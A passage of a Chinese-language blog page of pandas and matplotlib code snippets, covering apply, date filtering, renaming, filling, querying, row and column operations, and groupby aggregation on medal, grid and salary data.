class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.set_yticklabels([<span class="string">'0%'</span>,<span class="string">'10%'</span>,<span class="string">'20%'</span>,<span class="string">'30%'</span>,<span class="string">'40%'</span>,<span class="string">'50%'</span>])</span><br></pre></td></tr></table></figure><h3><span id="apply">apply</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建apply函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge_state</span><span class="params">(row)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">'Austin - EV'</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Off'</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">'Austin - EV'</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'On'</span></span><br><span class="line"><span class="comment"># 应用apply函数</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留2位小数，如23.12%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">turn_percentage</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'%.2f%%'</span> % (x * <span class="number">100</span>)</span><br><span class="line"><span class="comment"># 应用自定义函数</span></span><br><span class="line">ratio=ratio[<span class="string">'Austin - EV'</span>].apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们将会用到 transform 而不是 apply。 原因是， transform 将会保持 dataframe 矩阵的形状(shape)(就是行列数不变)而 apply 会改变矩阵的形状。</span></span><br></pre></td></tr></table></figure><h3><span id="重采样">重采样</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重采样</span></span><br><span class="line">df[<span class="string">'购买月份'</span>] = pd.to_datetime(df.日期).dt.to_period(<span class="string">"M"</span>)</span><br></pre></td></tr></table></figure><h3><span id="del">del</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> df[<span class="string">'a'</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df.drop(<span class="string">'a'</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="按时间筛选">按时间筛选</span></h3><ul><li>第一种</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将DateTime转成日期格式</span></span><br><span class="line">df[<span class="string">'DateTime'</span>] = pd.to_datetime(df[<span class="string">'DateTime'</span>])</span><br><span class="line"><span class="comment"># 将日期设为index</span></span><br><span class="line">df = df.set_index(<span class="string">'DateTime'</span>)</span><br><span class="line"><span class="comment"># 筛选从2019年3月1号到2019年3月10号整十天的电网数据</span></span><br><span class="line">df1 = df[<span class="string">'2019-03-01'</span>:<span class="string">'2019-03-10'</span>]</span><br></pre></td></tr></table></figure><ul><li>第二种<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 设置开始时间</span><br><span class="line">from_date &#x3D; df[&#39;DATA_DATE&#39;]&gt;&#x3D;&#39;2021-01-01&#39;</span><br><span class="line"># 设置结束时间</span><br><span class="line">to_date &#x3D; df[&#39;DATA_DATE&#39;]&lt;&#x3D;&#39;2021-03-31&#39;</span><br><span class="line"># 筛选数据时间段</span><br><span class="line">df &#x3D; df[from_date&amp;to_date]</span><br></pre></td></tr></table></figure></li></ul><h3><span id="显示中文">显示中文</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mac设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">'font.family'</span>] = <span class="string">'Heiti TC'</span><span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br></pre></td></tr></table></figure><h3><span id="重命名">重命名</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重命名 列</span></span><br><span class="line">q4_df.rename(columns=&#123;<span class="string">'AT_HOME'</span>:<span class="string">'empty_ratio'</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 重命名 索引</span></span><br><span class="line">df.rename_axis(<span class="string">"金牌排名"</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="填充">填充</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bfill 从后面往前填充</span></span><br><span class="line"><span class="string">ffill 从前往后</span></span><br><span class="line"><span class="string">默认列方向填充0，1使用行方向</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增一列 最多奖牌数量 列，值为该国 金、银、铜 牌数量中最多的一个奖牌数量</span></span><br><span class="line">df[<span class="string">'最多奖牌数量'</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">"金牌数"</span>, <span class="string">"银牌数"</span>,<span class="string">'铜牌数'</span>]].max(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="查询">查询</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询</span></span><br><span class="line">df.query(<span class="string">'金牌数+银牌数 &gt; 15'</span>)</span><br><span class="line"></span><br><span class="line">df[df.国家奥委会.str.contains(<span class="string">'国'</span>)]</span><br><span class="line"></span><br><span class="line">df_01.loc[df_01[<span class="string">'行业（按行业大类）'</span>].isin([<span class="string">'工业'</span>,<span class="string">'建筑业'</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">'行业（按行业大类）'</span>]==<span class="string">'工业'</span>)|(df_01[<span class="string">'行业（按行业大类）'</span>]==<span class="string">'建筑业'</span>)]</span><br><span class="line">df_01[df_01[<span class="string">'行业（按行业大类）'</span>].str.contains(<span class="string">'工业|建筑业'</span>)]</span><br></pre></td></tr></table></figure><h3><span id="选择类型">选择类型</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">'int'</span>,<span class="string">'float64'</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">'int'</span>,<span class="string">'float64'</span>])</span><br></pre></td></tr></table></figure><h3><span id="数据展开">数据展开</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df5.explode([<span class="string">'A'</span>,<span class="string">'C'</span>])</span><br></pre></td></tr></table></figure><h3><span id="数据累加">数据累加</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[list(<span class="string">'ABCD'</span>)].cumsum()</span><br><span class="line">df[list(<span class="string">'ABCD'</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="列操作">列操作</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 插入列</span></span><br><span class="line">tmp3 = (df[<span class="string">'春节期间（除夕至初六）用电量'</span>]-df[<span class="string">'节前温度接近的一周用电量'</span>])/df[<span class="string">'节前温度接近的一周用电量'</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line">df.columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line">df</span><br><span class="line"><span class="comment"># 删除列</span></span><br><span class="line">df.drop(<span class="string">'rate'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 新增列</span></span><br><span class="line">df[<span class="string">'比赛地点'</span>] = <span class="string">'东京'</span></span><br><span class="line"><span class="comment"># 新增一列 最多奖牌数量 列，值为该国 金、银、铜 牌数量中最多的一个奖牌数量 例如美国银牌最多，则为41，中国为38 bfill默认跨行填充</span></span><br><span class="line">df[<span class="string">'最多奖牌数量'</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">"金牌数"</span>, <span class="string">"银牌数"</span>,<span class="string">'铜牌数'</span>]].max(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 如果一个国家的金牌数大于 30 则值为 是，反之为 否</span></span><br><span class="line">df[<span class="string">'金牌大于30'</span>]  = np.where(df[<span class="string">'金牌数'</span>] &gt; <span class="number">30</span>, <span class="string">'是'</span>, <span class="string">'否'</span>)</span><br><span class="line"><span class="comment"># 删除 df 的 7、8、9、10 列</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 提取第1，2，3，4列</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># 提取 金牌数、银牌数、铜牌数 三列</span></span><br><span class="line">df[[<span class="string">'金牌数'</span>,<span class="string">'银牌数'</span>,<span class="string">'铜牌数'</span>]]</span><br><span class="line"><span class="comment"># 提取全部列名中以 “数” 结尾的列</span></span><br><span class="line">df.loc[:, df.columns.str.endswith(<span class="string">'数'</span>)]</span><br></pre></td></tr></table></figure><h3><span id="行操作">行操作</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 插入行 先切分再插入</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除第一行</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 条件删除</span></span><br><span class="line">df.drop(df[df.金牌数&lt;<span class="number">20</span>].index)</span><br><span class="line"><span class="comment"># 提取倒数后三列的10-20行</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,<span class="number">-3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">'总分'</span>:] </span><br><span class="line"><span class="comment"># 提取第 10 行 </span></span><br><span class="line"><span class="comment"># DataFrame格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Series格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># 提取第 10 行之后的全部行</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line">df.loc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># 提取 0-50 行，间隔为 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 提取 金牌数 不等于 10 的行</span></span><br><span class="line">df.loc[~(df[<span class="string">'金牌数'</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># 提取奇数行</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(df.index))]]</span><br><span class="line"><span class="comment"># 提取 中国、美国、英国、日本、巴西 五行数据 且 金牌数小于30</span></span><br><span class="line">df.loc[(df[<span class="string">'金牌数'</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">'国家奥委会'</span>].isin([<span class="string">'中国'</span>,<span class="string">'美国'</span>,<span class="string">'英国'</span>,<span class="string">'日本'</span>,<span class="string">'巴西'</span>]))]</span><br><span class="line"><span class="comment"># 包含某个字的行</span></span><br><span class="line">df[df.国家奥委会.str.contains(<span class="string">'国'</span>)]</span><br><span class="line"><span class="comment"># 提取 第 0-2 行第 0-2 列</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 + 银牌数 大于 15 的国家</span></span><br><span class="line">df.query(<span class="string">'金牌数+银牌数 &gt; 15'</span>)</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 大于 金牌均值的国家</span></span><br><span class="line">gold_mean = df[<span class="string">'金牌数'</span>].mean()</span><br><span class="line">df.query(<span class="string">f'金牌数 &gt; <span class="subst">&#123;gold_mean&#125;</span>'</span>)</span><br><span class="line"><span class="comment"># 指定位置插入行</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 调整 顺序</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br></pre></td></tr></table></figure><h3><span id="pivot与groupby">pivot与groupby</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">'奖牌类型'</span>],index = [<span class="string">'国家'</span>,<span class="string">'运动类别'</span>],aggfunc = <span class="string">'count'</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">'国家'</span>,<span class="string">'运动类别'</span>]).count()[<span class="string">'奖牌类型'</span>])</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df2.groupby([<span class="string">'国家'</span>,<span class="string">'运动类别'</span>]).count()[[<span class="string">'奖牌类型'</span>]]</span><br></pre></td></tr></table></figure><h3><span id="unstack">unstack</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算前十名各国每日奖牌数量合计</span></span><br><span class="line"><span class="comment"># 注意：对于第一天没有数据的国家用0填充，其余时间的缺失值用上一日数据填充</span></span><br><span class="line">countries = df2.groupby(<span class="string">'国家'</span>).count().sort_values(<span class="string">'奖牌类型'</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">'国家'</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">'获奖时间'</span>,<span class="string">'国家'</span>]).count()[<span class="string">'奖牌类型'</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3><span id="数据聚合">数据聚合</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分组，但不作为索引</span></span><br><span class="line">df.groupby(<span class="string">"district"</span>, as_index=<span class="literal">False</span>)[<span class="string">'salary'</span>].mean()</span><br><span class="line"><span class="comment"># 分组统计</span></span><br><span class="line">df.groupby(<span class="string">"district"</span>)[<span class="string">'companySize'</span>].value_counts()</span><br><span class="line"><span class="comment"># 或者groupby两个</span></span><br><span class="line">df.groupby([<span class="string">'district'</span>,<span class="string">'companySize'</span>])[<span class="string">'companySize'</span>].count()</span><br><span class="line"><span class="comment"># 查看group的结果</span></span><br><span class="line">df.groupby([<span class="string">"district"</span>,<span class="string">'salary'</span>]).groups</span><br><span class="line"><span class="comment"># 将数据按照 district、salary 进行分组，并查看西湖区薪资为 30000 的工作</span></span><br><span class="line">df.groupby([<span class="string">"district"</span>,<span class="string">'salary'</span>]).get_group((<span class="string">"西湖区"</span>,<span class="number">30000</span>))</span><br><span class="line"><span class="comment"># 计算不同行政区(district)，不同规模公司(companySize)出现的次数</span></span><br><span class="line">pd.DataFrame(df.groupby(<span class="string">"district"</span>)[<span class="string">'companySize'</span>].value_counts()) <span class="comment">#使用value_counts的方式，有时候比两个groupby好用</span></span><br><span class="line">df.groupby([<span class="string">'district'</span>,<span class="string">'companySize'</span>]).count().iloc[:,<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 分组</span></span><br><span class="line">df[<span class="string">'salary'</span>].groupby([df[<span class="string">'workYear'</span>], df[<span class="string">'education'</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">'workYear'</span>, <span class="string">'education'</span>]).mean()[<span class="string">'salary'</span>]</span><br><span class="line"><span class="comment"># 在原数据框 df 新增一列，数值为该区的平均薪资水平</span></span><br><span class="line">df[<span class="string">'该区平均工资'</span>] = df[[<span class="string">'district'</span>,<span class="string">'salary'</span>]].groupby(by=<span class="string">'district'</span>).transform(<span class="string">'mean'</span>)</span><br><span class="line"><span class="comment"># 通过匿名函数分组 根据 createTime 列，计算每天不同 行政区 新增的岗位数量</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">'district'</span>].value_counts()).rename_axis([<span class="string">"发布日"</span>, <span class="string">"行政区"</span>])</span><br><span class="line"><span class="comment"># 计算各行政区的企业领域（industryField）包含电商的总数</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>)[<span class="string">"industryField"</span>].apply(<span class="keyword">lambda</span> x: x.str.contains(<span class="string">'电商'</span>).sum())</span><br><span class="line"><span class="comment"># 计算各行政区的企业领域（industryField）包含电商的总数</span></span><br><span class="line">df.groupby(<span class="string">"district"</span>, sort=<span class="literal">False</span>)[<span class="string">"industryField"</span>].apply(</span><br><span class="line"><span class="keyword">lambda</span> x: x.str.contains(<span class="string">"电商"</span>).sum())</span><br><span class="line"><span class="comment">#通过 positionName 的长度进行分组，并计算不同长度岗位名称的薪资均值</span></span><br><span class="line">df.set_index(<span class="string">"positionName"</span>).groupby(len)[<span class="string">'salary'</span>].mean()</span><br><span class="line">df.groupby(df.positionName.apply(<span class="keyword">lambda</span> x:len(x)))[<span class="string">'salary'</span>].mean()</span><br><span class="line"><span class="comment"># groupby 直接改名</span></span><br><span class="line">df.groupby(&#123;<span class="string">'salary'</span>:<span class="string">'薪资'</span>,<span class="string">'score'</span>:<span class="string">'总分'</span>,<span class="string">'matchScore'</span>:<span class="string">'总分'</span>&#125;, axis=<span class="number">1</span>).sum()</span><br><span class="line"><span class="comment"># groupby 用字典</span></span><br><span class="line"><span class="comment">#将 score 和 matchScore 的和记为总分，与 salary 列同时进行分组，并查看结果</span></span><br><span class="line">df.groupby(&#123;<span class="string">'salary'</span>:<span class="string">'薪资'</span>,<span class="string">'score'</span>:<span class="string">'总分'</span>,<span class="string">'matchScore'</span>:<span class="string">'总分'</span>&#125;, axis=<span class="number">1</span>).sum()</span><br><span class="line"><span class="comment"># 聚合</span></span><br><span class="line">df[<span class="string">'salary'</span>].groupby(df[<span class="string">'district'</span>]).mean() </span><br><span class="line"><span class="comment"># 等价</span></span><br><span class="line">df[[<span class="string">'district'</span>,<span class="string">'salary'</span>]].groupby(<span class="string">'district'</span>).mean()</span><br><span class="line"><span class="comment"># 在原数据框 df 新增一列，数值为该区的平均薪资水平</span></span><br><span class="line">df[<span class="string">'该区平均工资'</span>] = df[[<span class="string">'district'</span>,<span class="string">'salary'</span>]].groupby(by=<span class="string">'district'</span>).transform(<span class="string">'mean'</span>)</span><br><span class="line"><span class="comment"># 提取平均工资小于 30000 的行政区的全部数据</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>).filter(<span class="keyword">lambda</span> x: x[<span class="string">'salary'</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># 分组计算不同行政区，薪水的最小值、最大值和平均值</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>)[<span class="string">'salary'</span>].agg([min, max, np.mean])</span><br><span class="line"><span class="comment"># 对不同行政区进行分组，并统计薪水的均值、中位数、方差，以及得分的均值</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>).agg(</span><br><span class="line">    &#123;<span class="string">'salary'</span>: [np.mean, np.median, np.std], <span class="string">'score'</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># 通过 df2 计算获得奖牌最多的运动员</span></span><br><span class="line">df2[<span class="string">'运动员'</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 查看各国在不同项目上的获奖牌情况</span></span><br><span class="line">df2[<span class="string">'总奖牌数'</span>].groupby([df2[<span class="string">'国家'</span>],df2[<span class="string">'运动类别'</span>]]).count().to_frame()</span><br><span class="line">df2.groupby([<span class="string">'国家'</span>,<span class="string">'运动类别'</span>]).count()[<span class="string">'总奖牌数'</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">'奖牌类型'</span>],index = [<span class="string">'国家'</span>,<span class="string">'运动类别'</span>],aggfunc = <span class="string">'count'</span>)</span><br><span class="line"><span class="comment"># 按照行计算平均值</span></span><br><span class="line">df.mean(axis=<span class="string">'columns'</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#不是0，1是算每列的均值然后然后合并为一行</span></span><br><span class="line"><span class="comment"># 提取平均工资小于 30000 的行政区的全部数据</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>).filter(<span class="keyword">lambda</span> x: x[<span class="string">'salary'</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># 聚合统计</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">df.groupby(<span class="string">'district'</span>)[<span class="string">'salary'</span>].agg([min, max, np.mean])</span><br><span class="line"><span class="comment">#查看缺失值比例，并排序  不是count！！！</span></span><br><span class="line">data = df.isna().sum()/df.shape[<span class="number">0</span>]</span><br><span class="line">data.sort_values().map(<span class="keyword">lambda</span> x:<span class="string">"&#123;:.2%&#125;"</span>.format(x))</span><br><span class="line"><span class="comment">#对不同岗位(positionName)进行分组，并统计其薪水(salary)中位数和得分(score)均值</span></span><br><span class="line">df.groupby(<span class="string">'positionName'</span>).agg(&#123;<span class="string">'salary'</span>: np.median, <span class="string">'score'</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># 自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfunc</span><span class="params">(x)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x.max()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">'district'</span>).agg(最低工资=(<span class="string">'salary'</span>, <span class="string">'min'</span>), 最高工资=(</span><br><span class="line">    <span class="string">'salary'</span>, <span class="string">'max'</span>), 平均工资=(<span class="string">'salary'</span>, <span class="string">'mean'</span>), 最大值与均值差值=(<span class="string">'salary'</span>, myfunc)).rename_axis([<span class="string">"行政区"</span>])</span><br></pre></td></tr></table></figure><h3><span id="数据查询">数据查询</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 